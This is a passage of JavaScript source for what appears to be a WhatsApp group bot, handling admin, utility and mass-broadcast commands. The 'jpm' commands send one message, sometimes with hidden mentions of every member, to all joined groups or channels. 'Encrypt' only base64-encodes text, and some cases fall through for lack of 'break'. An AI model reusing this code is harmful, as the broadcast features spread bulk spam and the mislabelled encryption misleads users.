  await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 

}

break

case 'tourl': {    

    let q = m.quoted ? m.quoted : m;

    if (!q || !q.download) return ReplyButton(`Reply to an Image or Video with command ${prefix + command}`);

    

    let mime = q.mimetype || '';

    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {

        return ReplyButton('Only images or MP4 videos are supported!');

    }

    let media;

    try {

        media = await q.download();

    } catch (error) {

        return ReplyButton('Failed to download media!');

    }

    const uploadImage = require('./system/Data1');

    const uploadFile = require('./system/Data2');

    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);

    let link;

    try {

        link = await (isTele ? uploadImage : uploadFile)(media);

    } catch (error) {

        return ReplyButton('Failed to upload media!');

    }

    ReplyButton(`${link}`)

}

break

case "joingc": case "join": {

if (!isCreator) return ReplyButton(mess.owner);

if (!q) return ReplyButton(example("linkgcnya"))

let result = args[0].split("https://chat.whatsapp.com/")[1];

let target = await client.groupAcceptInvite(result);

ReplyButton(`Successfully joined group ✅`)

}

//=================================================//
// ==============================
// GROUP MANAGEMENT COMMANDS
// ==============================

case 'promote': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Usage: !promote @user or reply to user message');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    try {
        // Promote user to admin
        await client.groupParticipantsUpdate(m.chat, [participantJid], 'promote');
        
        ReplyButton(`👑 Promoted *@${number}* to group admin.`, m.chat, {
            mentions: [participantJid]
        });
    } catch (error) {
        console.error('Promote error:', error);
        ReplyButton('Failed to promote user. They might already be an admin.');
    }
    break;
}

case 'demote': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Usage: !demote @user or reply to user message');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    try {
        // Check if user is not the group owner
        const metadata = await client.groupMetadata(m.chat);
        if (metadata.owner === participantJid) {
            return ReplyButton('Cannot demote group owner.', m.chat);
        }
        
        // Demote user from admin
        await client.groupParticipantsUpdate(m.chat, [participantJid], 'demote');
        
        ReplyButton(`🔻 Demoted *@${number}* from admin role.`, m.chat, {
            mentions: [participantJid]
        });
    } catch (error) {
        console.error('Demote error:', error);
        ReplyButton('Failed to demote user. They might not be an admin.');
    }
    break;
}

case 'invite':
case 'link': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    try {
        // Get group invite code
        const code = await client.groupInviteCode(m.chat);
        const inviteLink = `https://chat.whatsapp.com/${code}`;
        
        ReplyButton(`🔗 Group Invite Link:\n${inviteLink}\n\nShare this link to invite people to the group.`);
    } catch (error) {
        console.error('Invite error:', error);
        ReplyButton('Failed to generate invite link. I may need admin permissions.');
    }
    break;
}

case 'revoke':
case 'resetlink': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    try {
        // Revoke current invite link and generate new one
        await client.groupRevokeInvite(m.chat);
        const newCode = await client.groupInviteCode(m.chat);
        const newInviteLink = `https://chat.whatsapp.com/${newCode}`;
        
        ReplyButton(`🔄 New Group Invite Link:\n${newInviteLink}\n\nOld link has been revoked.`);
    } catch (error) {
        console.error('Revoke error:', error);
        ReplyButton('Failed to reset invite link. I may need admin permissions.');
    }
    break;
}

case 'setdesc':
case 'setdescription': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const description = args.join(' ');
    if (!description) return ReplyButton('Usage: !setdesc New group description');
    
    try {
        // Set group description
        await client.groupUpdateDescription(m.chat, description);
        
        ReplyButton('📝 Group description updated successfully.');
    } catch (error) {
        console.error('Setdesc error:', error);
        ReplyButton('Failed to update group description. I may need admin permissions.');
    }
    break;
}

case 'setname':
case 'setgroupname': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const name = args.join(' ');
    if (!name) return ReplyButton('Usage: !setname New group name');
    
    try {
        // Set group subject
        await client.groupUpdateSubject(m.chat, name);
        
        ReplyButton('🏷️ Group name updated successfully.');
    } catch (error) {
        console.error('Setname error:', error);
        ReplyButton('Failed to update group name. I may need admin permissions.');
    }
    break;
}

case 'groupinfo':
case 'ginfo': {
    if (!m.isGroup) return ReplyButton(mess.group);
    
    try {
        // Get group metadata
        const metadata = await client.groupMetadata(m.chat);
        const participants = metadata.participants;
        
        // Count admins and members
        const admins = participants.filter(p => p.admin).length;
        const members = participants.length - admins;
        
        // Get creation date
        const creationDate = new Date(metadata.creation * 1000).toLocaleDateString();
        
        const infoText = `📊 *Group Information*
        
🏷️ *Name:* ${metadata.subject}
👥 *Participants:* ${participants.length} total
👑 *Admins:* ${admins}
👤 *Members:* ${members}
📅 *Created:* ${creationDate}
🔗 *Invite Link:* ${metadata.inviteLink ? 'Yes' : 'No'}
🔒 *Restricted:* ${metadata.restrict ? 'Yes' : 'No'}
📢 *Announcement:* ${metadata.announce ? 'Yes' : 'No'}
        `;
        
        ReplyButton(infoText);
    } catch (error) {
        console.error('Groupinfo error:', error);
        ReplyButton('Failed to get group information.');
    }
    break;
}

case 'members':
case 'list': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isAdmins) return ReplyButton(mess.admin); // Only admins can see full list
    
    try {
        const metadata = await client.groupMetadata(m.chat);
        const participants = metadata.participants;
        
        let memberList = `👥 Group Members (${participants.length}):\n\n`;
        
        participants.forEach((participant, index) => {
            const number = participant.id.split('@')[0];
            const status = participant.admin ? '👑 Admin' : '👤 Member';
            memberList += `${index + 1}. @${number} - ${status}\n`;
        });
        
        // Split if too long (WhatsApp has message length limits)
        if (memberList.length > 4096) {
            const part1 = memberList.substring(0, 4000);
            const part2 = memberList.substring(4000);
            
            await ReplyButton(part1, m.chat, {
                mentions: participants.map(p => p.id)
            });
            
            await ReplyButton(part2, m.chat, {
                mentions: participants.map(p => p.id)
            });
        } else {
            await ReplyButton(memberList, m.chat, {
                mentions: participants.map(p => p.id)
            });
        }
        
    } catch (error) {
        console.error('Members error:', error);
        ReplyButton('Failed to get member list.');
    }
    break;
}

case 'tagall':
case 'everyone': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isAdmins) return ReplyButton(mess.admin); // Only admins can tag all
    
    const message = args.join(' ') || 'Hello everyone!';
    
    try {
        const metadata = await client.groupMetadata(m.chat);
        const participants = metadata.participants;
        
        // Create mention list
        const mentions = participants.map(p => p.id);
        
        ReplyButton(`📢 ${message}`, m.chat, {
            mentions: mentions
        });
    } catch (error) {
        console.error('Tagall error:', error);
        ReplyButton('Failed to tag all members.');
    }
    break;
}

case 'leave': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isAdmins) return ReplyButton(mess.admin); // Only admins can make bot leave
    
    try {
        // Confirm before leaving
        await ReplyButton('⚠️ Are you sure you want me to leave this group? Reply with "yes" to confirm.');
        
        // Wait for confirmation
        const filter = (msg) => msg.sender === m.sender && msg.body.toLowerCase() === 'yes';
        const response = await client.waitForMessage(m.chat, filter, { time: 30000 });
        
        if (response) {
            await ReplyButton('👋 Goodbye everyone! Leaving the group now...');
            await client.groupLeave(m.chat);
        } else {
            await ReplyButton('❌ Leave command cancelled.');
        }
    } catch (error) {
        console.error('Leave error:', error);
        ReplyButton('Failed to leave group.');
    }
    break;
}

case 'add': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const numbers = args.map(arg => arg.replace(/[^0-9]/g, '')).filter(num => num);
    if (numbers.length === 0) return ReplyButton('Usage: !add 1234567890 0987654321');
    
    try {
        const jids = numbers.map(num => num + '@s.whatsapp.net');
        
        // Add participants to group
        await client.groupParticipantsUpdate(m.chat, jids, 'add');
        
        ReplyButton(`✅ Added ${numbers.length} participant(s) to the group.`, m.chat, {
            mentions: jids
        });
    } catch (error) {
        console.error('Add error:', error);
        ReplyButton('Failed to add participants. They might have privacy restrictions.');
    }
    break;
}

case 'groupicon':
case 'seticon': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    if (!m.quoted || !m.quoted.message?.imageMessage) {
        return ReplyButton('Please reply to an image to set as group icon.');
    }
    
    try {
        const imageBuffer = await m.quoted.download();
        
        // Set group icon
        await client.setProfilePicture(imageBuffer, m.chat);
        
        ReplyButton('🖼️ Group icon updated successfully.');
    } catch (error) {
        console.error('Groupicon error:', error);
        ReplyButton('Failed to set group icon. I may need admin permissions.');
    }
    break;
}

case 'mutegroup': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    try {
        // Set group to announcement mode (only admins can send messages)
        await client.groupSettingUpdate(m.chat, 'announcement');
        
        ReplyButton('🔇 Group muted. Only admins can send messages now.');
    } catch (error) {
        console.error('Mutegroup error:', error);
        ReplyButton('Failed to mute group. I may need admin permissions.');
    }
    break;
}

case 'unmutegroup': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    try {
        // Set group to not announcement mode (everyone can send messages)
        await client.groupSettingUpdate(m.chat, 'not_announcement');
        
        ReplyButton('🔊 Group unmuted. Everyone can send messages now.');
    } catch (error) {
        console.error('Unmutegroup error:', error);
        ReplyButton('Failed to unmute group. I may need admin permissions.');
    }
    break;
}

case 'admins':
case 'listadmins': {
    if (!m.isGroup) return ReplyButton(mess.group);
    
    try {
        const metadata = await client.groupMetadata(m.chat);
        const admins = metadata.participants.filter(p => p.admin);
        
        let adminList = `👑 Group Admins (${admins.length}):\n\n`;
        
        admins.forEach((admin, index) => {
            const number = admin.id.split('@')[0];
            adminList += `${index + 1}. @${number}\n`;
        });
        
        ReplyButton(adminList, m.chat, {
            mentions: admins.map(a => a.id)
        });
    } catch (error) {
        console.error('Admins error:', error);
        ReplyButton('Failed to get admin list.');
    }
    break;
}
// Command Group
case 'kick':
case 'remove': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Use with: \n. Tag\n. Reply\n. Number\n\nExample: ' + prefix + command + '27xxx');
    }
    
    // Check if the number is valid
    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Invalid number!");
    
    // Get the participant JID
    const participantJid = number + '@s.whatsapp.net';
    
    try {
        // Remove the participant from the group
        await client.groupParticipantsUpdate(m.chat, [participantJid], 'remove');
        
        ReplyButton(`Successfully kicked *@${number}* from the group.`, m.chat, { 
            mentions: [participantJid] 
        });
    } catch (error) {
        console.error('Kick error:', error);
        ReplyButton('Failed to kick user. I may need higher permissions.');
    }
    break;
}
case 'out':
case 'mbulale': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        // Extract numbers only (supports any country code)
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Use with: \n. Tag user\n. Reply to user message\n. Enter user number\n\nExample: ' + prefix + command + '27xxx');
    }
    
    // Validate and format the number
    if (!number) return ReplyButton("Please provide a valid number!");
    
    // Check if the number is registered on WhatsApp
    let ceknum;
    try {
        ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
        if (!ceknum || !ceknum.length) return ReplyButton("This number is not registered on WhatsApp!");
    } catch (e) {
        console.error('WhatsApp check error:', e);
        // Continue anyway as the number might be valid but API call failed
    }
    
    // Get the participant JID
    const participantJid = number + '@s.whatsapp.net';
    
    try {
        // Check if user is in group
        const groupMetadata = await client.groupMetadata(m.chat);
        const participants = groupMetadata.participants.map(p => p.id);
        
        if (!participants.includes(participantJid)) {
            return ReplyButton(`User *@${number}* is not in this group.`, m.chat, {
                mentions: [participantJid]
            });
        }
        
        // Remove the participant from the group (force remove)
        const result = await client.groupParticipantsUpdate(m.chat, [participantJid], 'remove');
        
        if (result[0]?.status === 200) {
            ReplyButton(`🚫 Successfully kicked *@${number}* from the group.`, m.chat, {
                mentions: [participantJid]
            });
        } else {
            ReplyButton(`Failed to kick user *@${number}*. They might be an admin or I don't have sufficient permissions.`, m.chat, {
                mentions: [participantJid]
            });
        }
    } catch (error) {
        console.error('Kick error:', error);
        
        // Special handling for different error cases
        if (error.message.includes('not in group')) {
            ReplyButton(`User *@${number}* is not in this group.`, m.chat, {
                mentions: [participantJid]
            });
        } else if (error.message.includes('admin')) {
            ReplyButton(`Cannot kick *@${number}* because they are an group admin.`, m.chat, {
                mentions: [participantJid]
            });
        } else {
            ReplyButton('Failed to kick user. I may need higher permissions or the user might not exist.');
        }
    }
    break;
}
//=================================================//

break;

case 'hidetag': {

  if (!isCreator) return;

  if (!m.isGroup) return;

  const groupMetadata = await client.groupMetadata(from);

  const participants = groupMetadata.participants.map(p => p.id);

  const messageText = q ? q : 'EXPLORE MD V4 Always Stay In Here';

  await client.sendMessage(from, {

    text: messageText,

    mentions: participants

  }, { quoted: null });

}

//=================================================//

// Command Jpm

//=================================================//

break

case "jpm": {

    if (!isCreator) return ReplyButton(mess.owner);

    if (!q) return ReplyButton(example("text can also send photo"));

    // Safe initialization

    if (!global.db) global.db = {};

    if (!global.db.groups) global.db.groups = {};

    let rest;

    if (/image/.test(mime)) {

        rest = await client.downloadAndSaveMediaMessage(qmsg);

    }

    const allgrup = await client.groupFetchAllParticipating();

    const res = Object.keys(allgrup);

    let count = 0;

    const ttks = text;

    const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks };

    const opsijpm = rest !== undefined ? "text & photo" : "text";

    const jid = m.chat;

    await ReplyButton(`Processing jpm *${opsijpm}* to ${res.length} group chats`);

    for (let i of res) {

        if (global.db.groups?.[i]?.blacklistjpm === true) continue;

        try {

            await client.sendMessage(i, pesancoy, { quoted: null });

            count++;

        } catch {}

        await sleep(3500);

    }

    if (rest !== undefined) await fs.unlinkSync(rest);

    await client.sendMessage(jid, { text: `Jpm *${opsijpm}* successfully sent to ${count} group chats` }, { quoted: m });

}

break;

case "jpmht": {

    if (!isCreator) return ReplyButton(mess.owner);

    if (!q) return ReplyButton(example("text can also send photo"));

    // Safe initialization

    if (!global.db) global.db = {};

    if (!global.db.groups) global.db.groups = {};

    let rest;

    if (/image/.test(mime)) {

        rest = await client.downloadAndSaveMediaMessage(qmsg);

    }

    const allgrup = await client.groupFetchAllParticipating();

    const res = Object.keys(allgrup);

    let count = 0;

    const ttks = text;

    const opsijpm = rest !== undefined ? "text & photo ht" : "text ht";

    const jid = m.chat;

    await ReplyButton(`Processing jpm *${opsijpm}* to ${res.length} group chats`);

    for (let i of res) {

        if (global.db.groups?.[i]?.blacklistjpm === true) continue;

        try {

            const ments = allgrup[i].participants.map(e => e.id);

            const pesancoy = rest !== undefined

                ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments }

                : { text: ttks, mentions: ments };

            await client.sendMessage(i, pesancoy, { quoted: null });

            count++;

        } catch (e) {

            console.error(`Failed to send to ${i}:`, e.message);

        }

        await sleep(3500);

    }

    if (rest !== undefined) await fs.unlinkSync(rest);

    await client.sendMessage(jid, {

        text: `Jpm *${opsijpm}* successfully sent to ${count} group chats`

    }, { quoted: m });

}

break;

case "addidch": {

    if (!isCreator && !isPremium) return ReplyButton(mess.premium);

    if (!text) return ReplyButton("Please enter channel link!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {

        return ReplyButton("Invalid channel link! Must be WhatsApp link (https://whatsapp.com/channel/...)");

    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];

    if (!channelId) return ReplyButton("Failed to extract ID from channel link!");

    try {

        let res = await client.newsletterMetadata("invite", channelId);

        if (!res.id) return ReplyButton("Invalid channel ID!");

        global.channels = loadChannels();

        if (global.channels.includes(res.id)) {

            return ReplyButton(`Channel ID *${res.id}* already registered!`);

        }

        global.channels.push(res.id);

        saveChannels(global.channels);

        ReplyButton(`Successfully added Channel ID *${res.id}* from link:\n${channelLink}\n\nChannel Name: ${res.name}`);

    } catch (e) {

        console.error(e);

        ReplyButton("Error occurred while processing channel link. Make sure link is valid!");

    }

}

break;

case "delidch": {

    if (!isCreator && !isPremium) return ReplyButton(mess.premium);

    if (!text) return ReplyButton("Please enter number or channel ID to delete!");

    global.channels = loadChannels();

    if (!isNaN(text)) {

        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {

            return ReplyButton("Invalid sequence number!");

        }

        let removed = global.channels.splice(index, 1);

        saveChannels(global.channels);

        ReplyButton(`Successfully deleted Channel ID: *${removed[0]}*`);

    } else {

        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {

            return ReplyButton("Channel ID not found!");

        }

        global.channels = global.channels.filter((id) => id !== channelId);

        saveChannels(global.channels);

        ReplyButton(`Successfully deleted Channel ID: *${channelId}*`);

    }

}

break;

case "listidch": {

    if (!isCreator && !isPremium) return ReplyButton(mess.premium);

    global.channels = loadChannels();

    if (global.channels.length === 0) {

        return ReplyButton("No channel IDs registered yet!");

    }

    let list = global.channels

        .map((id, index) => `${index + 1}. ${id}`)

        .join("\n");

    ReplyButton(`Registered Channel IDs List:\n\n${list}`);

}

break

case "jpmchvip": {

    if (!isCreator && !isPremium && !isOwnJasher) return ReplyButton(mess.premium);

    if (!text && !m.quoted) return ReplyButton(example("Text or reply text"));

    var teks = m.quoted ? m.quoted.text : text;

    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 

        return ReplyButton(`

╔══════════════════════════╗

        ❌ *ERROR* ❌

╚══════════════════════════╝

⚠️ No channels registered for *JPM*!

Please register channels first.

`);

    ReplyButton(`

╭─❰ *PROCESSING MESSAGE* ❱─╮

📬 *Sending Message To*: 

  ➥ *${global.channels.length} Channels*

⏳ *Please Wait...*

╰─────────────────────╯

    `);

    // Send message to all channels without delay

    await Promise.all(global.channels.map(async (id) => {

        try {

            await client.sendMessage(id, { text: teks }, { quoted: null });

            total += 1;

        } catch (e) {

            console.log(`⚠️ Failed to send to ${id}:`, e);

        }

    }));

    ReplyButton(`

╭─❰ *RESULT SUMMARY* ❱─╮

🎉 *Messages Sent*: 

  ➥ *${total} Channels*

✅ *Status*: Success!

📩 Wait You Dumbass If You Don't Wait I'll Kick You

╰─────────────────────╯

`);

}

break

case 'jpmch': {

    const cooldownTime = (Number(global.cd) || 300) * 1000;

    const now = Date.now();

    if (!global.lastJpmchTime) global.lastJpmchTime = 0;

    const timePassed = now - global.lastJpmchTime;

    const remaining = cooldownTime - timePassed;

    if (remaining > 0) {

        const detik = Math.ceil(remaining / 1000);

        return ReplyButton(`⏳ This feature is on cooldown.\nWait *${detik} seconds* more.`);

    }

    if (!isCreator && !isPremium && !isOwnJasher) return ReplyButton(mess.premium);

    if (!text && !m.quoted) return ReplyButton(example("Text or reply text"));

    const teks = m.quoted ? m.quoted.text : text;

    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0)

        return ReplyButton("⚠️ No channels registered.");

    ReplyButton("⏳ Sending message, please wait...");

    for (const id of global.channels) {

        try {

            await client.sendMessage(id, { text: teks }, { quoted: null });

            total++;

            await sleep(1000);

        } catch (e) {

            console.log(`❌ Failed to send to ${id}:`, e.message);

        }

    }

    global.lastJpmchTime = now;

    ReplyButton(`✅ Message successfully sent to *${total} channels*`);

}

//=================================================//

// General cmd
case 'ping': {
    const start = Date.now();
    
    // Send initial message
    const message = await ReplyButton('🏓 Pong!');
    
    const end = Date.now();
    const latency = end - start;
    const botLatency = `\n*Bot Latency:* ${latency}ms`;
    
    // Edit the message with latency information
    await client.sendMessage(m.chat, { 
        text: `🏓 Pong!${botLatency}\n*Runtime:* ${process.uptime().toFixed(2)}s`,
        edit: message.key 
    });
    
    break;
}
// ==============================
// UTILITY COMMANDS & GeNeRal
// ==============================

case 'translate': {
    if (!args[0]) return ReplyButton('Please specify text to translate. Usage: !translate en Hello');
    
    const targetLang = args[0].toLowerCase();
    const text = args.slice(1).join(' ');
    
    if (!text) return ReplyButton('Please provide text to translate.');
    
    try {
        // Using Google Translate API (you might need to install a translation package)
        const translated = await translateText(text, targetLang);
        ReplyButton(`🌐 Translation (${targetLang}):\n${translated}`);
    } catch (error) {
        console.error('Translate error:', error);
        ReplyButton('Translation failed. Please check the language code and try again.');
    }
    break;
}

case 'shorturl': {
    if (!args[0]) return ReplyButton('Please provide a URL to shorten. Usage: !shorturl https://example.com');
    
    let url = args[0];
    if (!url.startsWith('http')) url = 'https://' + url;
    
    try {
        // Using a URL shortening service (you might need an API key)
        const shortUrl = await shortenUrl(url);
        ReplyButton(`🔗 Shortened URL:\n${shortUrl}`);
    } catch (error) {
        console.error('ShortURL error:', error);
        ReplyButton('Failed to shorten URL. Please check the URL and try again.');
    }
    break;
}

case 'qr': {
    const text = args.join(' ') || m.quoted?.text || 'https://github.com';
    
    try {
        // Generate QR code
        const qrBuffer = await generateQRCode(text);
        
        // Send as image
        await client.sendMessage(m.chat, {
            image: qrBuffer,
            caption: `📇 QR Code for: ${text.length > 50 ? text.substring(0, 50) + '...' : text}`
        });
    } catch (error) {
        console.error('QR error:', error);
        ReplyButton('Failed to generate QR code.');
    }
    break;
}

case 'text2speech':
case 'tts': {
    const text = args.join(' ') || m.quoted?.text;
    if (!text) return ReplyButton('Please provide text to convert to speech. Usage: !tts Hello world');
    
    try {
        // Convert text to speech
        const audioBuffer = await textToSpeech(text);
        
        // Send as audio
        await client.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            ptt: true // Push-to-talk format for WhatsApp
        });
    } catch (error) {
        console.error('TTS error:', error);
        ReplyButton('Failed to convert text to speech.');
    }
    break;
}

case 'speech2text':
case 'stt': {
    if (!m.quoted || !m.quoted.message.audioMessage) {
        return ReplyButton('Please reply to an audio message to convert to text.');
    }
    
    try {
        // Download the audio
        const media = await m.quoted.download();
        
        // Convert speech to text
        const text = await speechToText(media);
        
        ReplyButton(`🎤 Speech to Text:\n${text}`);
    } catch (error) {
        console.error('STT error:', error);
        ReplyButton('Failed to convert speech to text.');
    }
    break;
}

case 'encrypt': {
    const text = args.join(' ') || m.quoted?.text;
    if (!text) return ReplyButton('Please provide text to encrypt. Usage: !encrypt secret message');
    
    try {
        // Simple encryption (you might want to use a more secure method)
        const encrypted = Buffer.from(text).toString('base64');
        ReplyButton(`🔒 Encrypted text:\n${encrypted}`);
    } catch (error) {
        console.error('Encrypt error:', error);
        ReplyButton('Failed to encrypt text.');
    }
    break;
}

case 'decrypt': {
    const text = args.join(' ') || m.quoted?.text;
    if (!text) return ReplyButton('Please provide text to decrypt. Usage: !decrypt encrypted_text');
    
    try {
        // Decode base64
        const decrypted = Buffer.from(text, 'base64').toString('utf8');
        ReplyButton(`🔓 Decrypted text:\n${decrypted}`);
    } catch (error) {
        console.error('Decrypt error:', error);
        ReplyButton('Failed to decrypt text. Make sure it\'s properly encrypted.');
    }
    break;
}

case 'password': {
    const length = parseInt(args[0]) || 12;
    if (length < 4 || length > 32) return ReplyButton('Password length must be between 4 and 32 characters.');
    
    try {
        // Generate strong password
        const password = generatePassword(length);
        ReplyButton(`🔑 Generated password (${length} chars):\n\`${password}\``);
    } catch (error) {
        console.error('Password error:', error);
        ReplyButton('Failed to generate password.');
    }
    break;
}

case 'notes':
case 'note': {
    const subcmd = args[0]?.toLowerCase();
    
    // Initialize user notes if not exists
    if (!userNotes[m.sender]) userNotes[m.sender] = [];
    
    if (!subcmd || subcmd === 'list') {
        // List all notes
        if (userNotes[m.sender].length === 0) {
            return ReplyButton('You have no saved notes. Use !note add [text] to create one.');
        }
        
        let noteList = '📝 Your Notes:\n\n';
        userNotes[m.sender].forEach((note, index) => {
            noteList += `${index + 1}. ${note.text.length > 30 ? note.text.substring(0, 30) + '...' : note.text}\n`;
        });
        
        ReplyButton(noteList);
    } 
    else if (subcmd === 'add') {
        // Add new note
        const noteText = args.slice(1).join(' ');
        if (!noteText) return ReplyButton('Please provide note text. Usage: !note add Remember to buy milk');
        
        userNotes[m.sender].push({
            text: noteText,
            time: Date.now()
        });
        
        saveNotes();
        ReplyButton('✅ Note added successfully!');
    }
    else if (subcmd === 'view') {
        // View specific note
        const index = parseInt(args[1]) - 1;
        if (isNaN(index) || index < 0 || index >= userNotes[m.sender].length) {
            return ReplyButton('Please provide a valid note number. Use !note list to see your notes.');
        }
        
        const note = userNotes[m.sender][index];
        const date = new Date(note.time).toLocaleString();
        ReplyButton(`📝 Note ${index + 1} (${date}):\n\n${note.text}`);
    }
    else if (subcmd === 'delete') {
        // Delete note
        const index = parseInt(args[1]) - 1;
        if (isNaN(index) || index < 0 || index >= userNotes[m.sender].length) {
            return ReplyButton('Please provide a valid note number. Use !note list to see your notes.');
        }
        
        userNotes[m.sender].splice(index, 1);
        saveNotes();
        ReplyButton('✅ Note deleted successfully!');
    }
    else {
        ReplyButton(`Invalid note command. Usage:
!note list - Show all notes
!note add [text] - Add new note
!note view [number] - View specific note
!note delete [number] - Delete note`);
    }
    break;
}

case 'calc':
case 'calculate': {
    const expression = args.join(' ');
    if (!expression) return ReplyButton('Please provide a math expression. Usage: !calc 2+2*3');
    
    try {
        // Simple calculation (be careful with eval for security)
        const result = safeEval(expression);
        ReplyButton(`🧮 Calculation:\n${expression} = ${result}`);
    } catch (error) {
        console.error('Calc error:', error);
        ReplyButton('Invalid math expression. Please check your input.');
    }
    break;
}

case 'timer': {
    const time = args[0];
    if (!time) return ReplyButton('Please specify timer duration. Usage: !timer 5m or !timer 30s');
    
    try {
        // Parse time (e.g., 5m, 30s, 1h)
        const timeMatch = time.match(/(\d+)([smh])/);
        if (!timeMatch) return ReplyButton('Invalid time format. Use like: 5m, 30s, 1h');
        
        const amount = parseInt(timeMatch[1]);
        const unit = timeMatch[2];
        
        let milliseconds;
        switch (unit) {
            case 's': milliseconds = amount * 1000; break;
            case 'm': milliseconds = amount * 60 * 1000; break;
            case 'h': milliseconds = amount * 60 * 60 * 1000; break;
        }
        
        ReplyButton(`⏰ Timer set for ${amount}${unit}. I'll notify you when time's up!`);
        
        // Set timeout
        setTimeout(async () => {
            await client.sendMessage(m.chat, {
                text: `⏰ Time's up! Your ${amount}${unit} timer has ended.`,
                mentions: [m.sender]
            });
        }, milliseconds);
    } catch (error) {
        console.error('Timer error:', error);
        ReplyButton('Failed to set timer.');
    }
    break;
}

case 'remind': {
    const time = args[0];
    const reminderText = args.slice(1).join(' ');
    
    if (!time || !reminderText) {
        return ReplyButton('Usage: !remind 5m Buy milk or !remind 1h Call mom');
    }
    
    try {
        // Parse time (similar to timer)
        const timeMatch = time.match(/(\d+)([smh])/);
        if (!timeMatch) return ReplyButton('Invalid time format. Use like: 5m, 30s, 1h');
        
        const amount = parseInt(timeMatch[1]);
        const unit = timeMatch[2];
        
        let milliseconds;
        switch (unit) {
            case 's': milliseconds = amount * 1000; break;
            case 'm': milliseconds = amount * 60 * 1000; break;
            case 'h': milliseconds = amount * 60 * 60 * 1000; break;
        }
        
        ReplyButton(`⏰ Reminder set for ${amount}${unit}. I'll remind you: "${reminderText}"`);
        
        // Set timeout
        setTimeout(async () => {
            await client.sendMessage(m.chat, {
                text: `⏰ Reminder: ${reminderText}`,
                mentions: [m.sender]
            });
        }, milliseconds);
    } catch (error) {
        console.error('Remind error:', error);
        ReplyButton('Failed to set reminder.');
    }
    break;
}
//=================================================//
// ==============================
// MODERATION COMMANDS
// ==============================

case 'ban': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Usage: !ban @user or reply to user message');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    try {
        // First kick then add to ban list
        await client.groupParticipantsUpdate(m.chat, [participantJid], 'remove');
        
        // Add to banned list (you need to maintain this array)
